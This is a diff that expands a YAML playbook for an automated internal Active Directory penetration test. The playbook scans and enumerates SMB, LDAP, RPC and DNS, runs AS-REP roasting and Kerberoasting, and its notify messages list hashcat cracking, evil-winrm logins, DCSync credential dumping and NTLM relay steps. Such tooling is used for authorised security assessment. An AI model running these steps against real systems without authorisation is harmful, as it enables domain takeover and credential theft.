@@ -1,45 +1,499 @@
-# Internal network pentest playbook — AD-focused
+name: Internal Network Pentest
+description: 'Active Directory / internal network assessment. Covers the full AD attack
+  surface: port scan of AD-relevant ports -> SMB deep enum -> LDAP anonymous -and
+  authenticated enum -> Kerberos attacks (AS-REP, Kerberoast, user enum) -> RPC endpoint
+  dump -> WinRM check -> delegation/ACL enum -> BloodHound- ready output -> cracking
+  guidance for captured material
 
-name: "Internal Network Pentest"
-description: "Active Directory / internal network assessment pipeline"
+  '
+version: '2.0'
 target_required: true
-
+vars:
+  wordlist_dir: /wordlists
+  domain: ''
+  username: ''
+  password: ''
+preflight:
+- id: preamble
+  type: log
+  message: 'Internal network/AD pentest starting — target: {target}, case: {case_id}'
+  name: Preamble
 steps:
-  - name: "Quick port scan (top 1000)"
-    tool: "nmap"
-    args: ["-sS", "-sV", "-Pn", "--top-ports", "1000", "--open",
-           "-oA", "{case_dir}/nmap-top1000", "{target}"]
-    timeout: 300
-    pause: 2
-
-  - name: "SMB enumeration"
-    tool: "crackmapexec"
-    args: ["smb", "{target}"]
-    when: "on_port:445"
+- id: ad_scan
+  name: AD-relevant port scan
+  tool: nmap
+  args:
+  - -sS
+  - -sV
+  - -Pn
+  - -T4
+  - -p
+  - 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986,9389
+  - --open
+  - -oA
+  - '{case_dir}/ad-ports'
+  - '{target}'
+  timeout: 300
+  pause: 2
+  artifacts:
+  - '{case_dir}/ad-ports.txt'
+  - '{case_dir}/ad-ports.xml'
+  type: tool
+- id: os_detect
+  name: OS fingerprinting
+  tool: nmap
+  args:
+  - -O
+  - --osscan-guess
+  - -p
+  - 445,3389
+  - '{target}'
+  - -oN
+  - '{case_dir}/os-detect.txt'
+  timeout: 120
+  artifacts:
+  - '{case_dir}/os-detect.txt'
+  type: tool
+- id: smb_enum
+  name: SMB deep enumeration
+  type: conditional
+  condition:
+    or:
+    - on_port:445
+    - on_port:139
+  then:
+  - id: smb_parallel
+    name: SMB enumeration
+    type: parallel
+    max_workers: 4
+    steps:
+    - id: smb_os
+      name: SMB OS and domain info
+      tool: nmap
+      args:
+      - --script
+      - smb-os-discovery
+      - -p
+      - '445'
+      - '{target}'
+      - -oN
+      - '{case_dir}/smb-os.txt'
+      timeout: 30
+      artifacts:
+      - '{case_dir}/smb-os.txt'
+      type: tool
+    - id: smb_shares
+      name: List SMB shares (null session)
+      tool: smbclient
+      args:
+      - -L
+      - //{target}/
+      - -N
+      - -g
+      timeout: 30
+      type: tool
+    - id: smb_signing
+      name: SMB signing check
+      tool: nmap
+      args:
+      - --script
+      - smb-security-mode
+      - -p
+      - '445'
+      - '{target}'
+      - -oN
+      - '{case_dir}/smb-signing.txt'
+      timeout: 30
+      artifacts:
+      - '{case_dir}/smb-signing.txt'
+      type: tool
+    - id: smb_ms17010
+      name: MS17-010 check
+      tool: nmap
+      args:
+      - --script
+      - smb-vuln-ms17-010
+      - -p
+      - '445'
+      - '{target}'
+      - -oN
+      - '{case_dir}/smb-ms17010.txt'
+      timeout: 60
+      artifacts:
+      - '{case_dir}/smb-ms17010.txt'
+      type: tool
+  - id: smb_enum4linux
+    name: enum4linux-ng full scan
+    tool: enum4linux-ng
+    args:
+    - -A
+    - -L
+    - -U
+    - -S
+    - -G
+    - '{target}'
+    - -oJ
+    - '{case_dir}/enum4linux.json'
+    timeout: 180
+    artifacts:
+    - '{case_dir}/enum4linux.json'
+    type: tool
+  - id: smb_cme
+    name: CrackMapExec SMB enum
+    tool: crackmapexec
+    args:
+    - smb
+    - '{target}'
+    timeout: 30
+    save: '{case_dir}/cme-smb.txt'
+    type: tool
+  else:
+  - id: smb_skip
+    type: log
+    message: SMB not detected
+    name: Smb Skip
+- id: ldap_enum
+  name: LDAP enumeration
+  type: conditional
+  condition:
+    or:
+    - on_port:389
+    - on_port:636
+  then:
+  - id: ldap_base
+    name: LDAP base and naming contexts
+    tool: ldapsearch
+    args:
+    - -x
+    - -H
+    - ldap://{target}
+    - -b
+    - ''
+    - -s
+    - base
+    - namingContexts
+    timeout: 30
+    save: '{case_dir}/ldap-base.txt'
+    type: tool
+  - id: ldap_nmap
+    name: LDAP NSE scripts
+    tool: nmap
+    args:
+    - --script
+    - ldap-rootdse,ldap-search
+    - -p
+    - '389'
+    - '{target}'
+    - -oN
+    - '{case_dir}/ldap-nmap.txt'
     timeout: 60
-
-  - name: "SMB shares"
-    tool: "smbclient"
-    args: ["-L", "//{target}/", "-N"]
-    when: "on_port:445"
+    artifacts:
+    - '{case_dir}/ldap-nmap.txt'
+    type: tool
+  - id: ldap_naming_contexts
+    name: Dump naming contexts
+    tool: ldapsearch
+    args:
+    - -x
+    - -H
+    - ldap://{target}
+    - -b
+    - ''
+    - -s
+    - base
     timeout: 30
-
-  - name: "LDAP enumeration"
-    tool: "ldapsearch"
-    args: ["-x", "-H", "ldap://{target}", "-b", "", "-s", "base",
-           "namingcontexts"]
-    when: "on_port:389"
-    timeout: 30
-
-  - name: "RPC enumeration"
-    tool: "rpcclient"
-    args: ["-U", "", "-N", "{target}"]
-    when: "on_port:135"
-    timeout: 30
-
-  - name: "Kerberos scan"
-    tool: "nmap"
-    args: ["--script", "krb5-enum-users", "-p", "88", "{target}",
-           "-oN", "{case_dir}/kerberos.txt"]
-    when: "on_port:88"
+    save: '{case_dir}/ldap-naming-contexts.txt'
+    type: tool
+  else:
+  - id: ldap_skip
+    type: log
+    message: LDAP not detected
+    name: Ldap Skip
+- id: kerberos_attacks
+  name: Kerberos reconnaissance and attacks
+  type: conditional
+  condition:
+    or:
+    - on_port:88
+    - on_port:464
+  then:
+  - id: kerb_user_enum
+    name: Kerberos user enumeration
+    tool: nmap
+    args:
+    - --script
+    - krb5-enum-users
+    - -p
+    - '88'
+    - '{target}'
+    - -oN
+    - '{case_dir}/kerberos-users.txt'
+    timeout: 120
+    artifacts:
+    - '{case_dir}/kerberos-users.txt'
+    type: tool
+  - id: kerb_asrep
+    name: AS-REP roasting
+    tool: impacket-GetNPUsers
+    args:
+    - -dc-ip
+    - '{target}'
+    - -request
+    - -format
+    - hashcat
     timeout: 60
+    when:
+      and:
+      - on_port:88
+      - on_port:445
+    save: '{case_dir}/asrep-hashes.txt'
+    type: tool
+  - id: kerb_roast
+    name: Kerberoasting
+    tool: impacket-GetUserSPNs
+    args:
+    - -dc-ip
+    - '{target}'
+    - -request
+    timeout: 60
+    when:
+      and:
+      - on_port:88
+      - on_port:445
+    save: '{case_dir}/kerberoast-hashes.txt'
+    type: tool
+  - id: kerb_notify
+    type: notify
+    level: warn
+    message: 'Kerberos open — AD confirmed. AS-REP hashes: {case_dir}/asrep-hashes.txt,
+      Kerberoast hashes: {case_dir}/kerberoast-hashes.txt'
+    name: Kerb Notify
+  - id: kerb_cracking
+    type: log
+    message: 'Crack captured hashes: hashcat -m 18200 asrep-hashes.txt rockyou.txt
+      (AS-REP) | hashcat -m 13100 kerberoast-hashes.txt rockyou.txt (Kerberoast)'
+    name: Kerb Cracking
+  else:
+  - id: kerb_skip
+    type: log
+    message: Kerberos not detected
+    name: Kerb Skip
+- id: rpc_enum
+  name: RPC endpoint enumeration
+  type: conditional
+  condition: on_port:135
+  then:
+  - id: rpc_nmap
+    name: RPC NSE info
+    tool: nmap
+    args:
+    - --script
+    - msrpc-enum,rpcinfo
+    - -p
+    - '135'
+    - '{target}'
+    - -oN
+    - '{case_dir}/rpc-nmap.txt'
+    timeout: 60
+    artifacts:
+    - '{case_dir}/rpc-nmap.txt'
+    type: tool
+  - id: rpc_dump
+    name: RPC endpoint dump
+    tool: rpcdump
+    args:
+    - -p
+    - '135'
+    - '{target}'
+    timeout: 60
+    save: '{case_dir}/rpc-dump.txt'
+    type: tool
+  - id: rpcclient_enum
+    name: rpcclient domain enum
+    tool: rpcclient
+    args:
+    - -U
+    - ''
+    - -N
+    - '{target}'
+    - -c
+    - enumdomusers;enumdomgroups;querydominfo;lsaquery
+    timeout: 60
+    artifacts:
+    - '{case_dir}/rpcclient.txt'
+    type: tool
+  else:
+  - id: rpc_skip
+    type: log
+    message: RPC not detected
+    name: Rpc Skip
+- id: winrm_phase
+  name: WinRM assessment
+  type: conditional
+  condition:
+    or:
+    - on_port:5985
+    - on_port:5986
+  then:
+  - id: winrm_check
+    name: WinRM auth check
+    tool: crackmapexec
+    args:
+    - winrm
+    - '{target}'
+    timeout: 30
+    save: '{case_dir}/winrm-check.txt'
+    type: tool
+  - id: winrm_notify
+    type: notify
+    level: warn
+    message: 'WinRM open — check for admin creds: evil-winrm -i {target} -u USER -p
+      PASS'
+    name: Winrm Notify
+  else:
+  - id: winrm_skip
+    type: log
+    message: WinRM not detected
+    name: Winrm Skip
+- id: rdp_phase
+  name: RDP assessment
+  type: conditional
+  condition: on_port:3389
+  then:
+  - id: rdp_scan
+    name: RDP vuln scan
+    tool: nmap
+    args:
+    - --script
+    - rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020
+    - -p
+    - '3389'
+    - '{target}'
+    - -oN
+    - '{case_dir}/rdp-scan.txt'
+    timeout: 60
+    artifacts:
+    - '{case_dir}/rdp-scan.txt'
+    type: tool
+  - id: rdp_notify
+    type: notify
+    level: warn
+    message: RDP (3389) open — BlueKeep potentially exploitable
+    name: Rdp Notify
+  else:
+  - id: rdp_skip
+    type: log
+    message: RDP not detected
+    name: Rdp Skip
+- id: dns_phase
+  name: DNS enumeration
+  type: conditional
+  condition: on_port:53
+  then:
+  - id: dns_zone
+    name: DNS zone transfer
+    tool: dig
+    args:
+    - axfr
+    - '@{target}'
+    timeout: 30
+    save: '{case_dir}/dns-zone.txt'
+    type: tool
+  - id: dns_recon
+    name: DNS recon
+    tool: dnsrecon
+    args:
+    - -d
+    - '{target}'
+    - -a
+    - --csv
+    - '{case_dir}/dnsrecon.csv'
+    timeout: 120
+    artifacts:
+    - '{case_dir}/dnsrecon.csv'
+    type: tool
+  else:
+  - id: dns_skip
+    type: log
+    message: DNS not detected
+    name: Dns Skip
+- id: ad_deep
+  name: AD full attack guide
+  type: conditional
+  condition:
+    and:
+    - on_port:88
+    - on_port:389
+    - on_port:445
+  then:
+  - id: ad_guide
+    type: notify
+    level: warn
+    message: 'Full AD attack chain available for {target}: 1. BloodHound: bloodhound-python
+      -d DOMAIN -u USER -p PASS -ns {target} -c All 2. AS-REP roast: impacket-GetNPUsers
+      DOMAIN/ -dc-ip {target} -request 3. Kerberoast: impacket-GetUserSPNs DOMAIN/
+      -dc-ip {target} -request 4. DCSync: impacket-secretsdump DOMAIN/USER:PASS@{target}
+      5. SMB relay: if signing disabled, use impacket-ntlmrelayx
+
+      '
+    name: Ad Guide
+  else:
+  - id: ad_skip_guide
+    type: log
+    message: AD not fully present — skipping AD attack guide
+    name: Ad Skip Guide
+- id: gen_report
+  name: Generate internal network report
+  type: report
+  format: markdown
+  title: Internal Network Assessment — {target}
+  output: '{case_dir}/internal-network-report.md'
+  sections:
+  - heading: Target
+    body: '- Target: {target}
+
+      - Domain: {domain}'
+  - heading: AD Port Scan
+    body: '- AD ports: {case_dir}/ad-ports.txt
+
+      - OS: {case_dir}/os-detect.txt'
+  - heading: SMB
+    body: '- SMB OS: {case_dir}/smb-os.txt
+
+      - SMB signing: {case_dir}/smb-signing.txt
+
+      - MS17-010: {case_dir}/smb-ms17010.txt
+
+      - enum4linux: {case_dir}/enum4linux.json
+
+      - CME: {case_dir}/cme-smb.txt'
+  - heading: LDAP
+    body: '- Base DN: {case_dir}/ldap-base.txt
+
+      - NSE: {case_dir}/ldap-nmap.txt
+
+      - Naming contexts: {case_dir}/ldap-naming-contexts.txt'
+  - heading: Kerberos
+    body: '- User enum: {case_dir}/kerberos-users.txt
+
+      - AS-REP hashes: {case_dir}/asrep-hashes.txt
+
+      - Kerberoast hashes: {case_dir}/kerberoast-hashes.txt'
+  - heading: RPC
+    body: '- NSE: {case_dir}/rpc-nmap.txt
+
+      - Dump: {case_dir}/rpc-dump.txt
+
+      - rpcclient: {case_dir}/rpcclient.txt'
+  - heading: Remote Access
+    body: '- WinRM: {case_dir}/winrm-check.txt
+
+      - RDP: {case_dir}/rdp-scan.txt
+
+      - DNS: {case_dir}/dns-zone.txt'
+postflight:
+- id: done
+  type: notify
+  level: success
+  message: Internal network assessment complete — report at {case_dir}/internal-network-report.md
+  name: Done
